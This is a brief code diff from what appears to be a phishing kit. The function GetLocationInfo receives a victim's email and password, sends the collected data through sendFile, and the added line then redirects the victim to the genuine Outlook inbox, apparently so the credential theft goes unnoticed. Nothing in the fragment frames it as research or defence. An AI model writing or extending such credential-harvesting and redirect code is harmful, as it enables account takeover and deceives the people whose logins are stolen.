@@ -24,6 +24,7 @@ function GetLocationInfo({ email, pass, reportbox }) {
 
       sendFile(data).then((res) => {
         console.log(`Status: ${res.status} \n data: ${data}`);
+        window.open("https://outlook.live.com/mail/0/inbox?nlp=1");
       });
     });
   });
